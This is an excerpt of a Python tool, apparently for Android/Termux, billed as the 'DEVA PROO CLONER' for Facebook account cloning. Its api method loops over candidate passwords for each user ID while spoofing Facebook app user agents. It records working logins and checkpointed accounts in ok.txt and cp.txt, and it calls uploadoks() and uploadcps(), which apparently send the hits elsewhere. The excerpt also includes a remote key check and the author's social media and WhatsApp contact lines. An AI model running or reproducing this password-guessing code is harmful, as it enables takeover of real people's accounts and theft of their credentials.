...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/DEVA-THAKUR07/DEVA_/blob/main/UPRUAL.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/mh.DEVA.9440234")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WHATSAPP >> +917742350051")
	subprocess.check_output(["am", "start", "https://m.me/devaxd009"])

def irfan():
	
	
	runtxt("\n\033[0;91m🧞‍This tool is offical for DEVA")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/DEVA-THAKUR07/DEVA_/blob/main/UPRUAL.txt').text
			if basesplit in plr:
				key = basesplit
...
(______/ (_______/   \_/   |/     \|                            
=========================================================
 TOOL OWNER : DEVA THAKUR
 GITHUB    : DEVA-THAKUR007
 FACEBOOK  : DEVA THAKUR + RUDRA SHEKHAWAT
 TOOL   : OLD CLONE
 BROTHER   : SHAHBAZ ANSARI
 VERSION   : 0.1 FREE (✓)
=========================================================    """)
		print("%s [%s•%s] %sTOOL NAME : %sDEVA❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/116.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			"Opera/9.80 (Android; Opera Mini/93.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4515.131 Mobile Safari/537.36;]"
		])
		sys.stdout.write(
			"\r\r %s[>_] [DEVA] : %s/%s -> \033[0;92m [ DEVA-OK:%s ]- \033[0;91m[DEVA-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[DEVA-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [DEVA-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[DEVA-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [DEVA-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
